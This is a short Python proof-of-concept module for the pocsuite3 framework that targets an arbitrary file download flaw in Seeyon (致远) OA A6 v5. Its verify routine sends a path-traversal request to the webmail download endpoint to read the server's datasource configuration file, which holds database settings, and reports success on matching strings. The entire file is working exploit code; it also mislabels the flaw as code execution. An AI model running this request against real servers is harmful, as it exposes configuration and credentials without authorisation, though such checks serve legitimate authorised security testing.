from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class DemoPOC(POCBase):
    vulID = '123'  # ssvid
    version = '1.0'
    name = '致远OA A6 - v5 任意文件下载漏洞'
    appName = '致远OA A6 - v5 任意文件下载漏洞'
    appVersion = 'v5'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''致远任意文件读取'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/seeyon/webmail.do?method=doDownloadAtt&filename=indexx.jsp&filePath=../conf/datasourceCtp.properties"
            r = requests.get(url=target,timeout=5,verify=False)
            if r.status_code == 200 and "ctpDataSource.minCount=50" in r.text or "mysql.path=" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                return self.parse_output(result)
        except Exception as e:
            print(e)
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)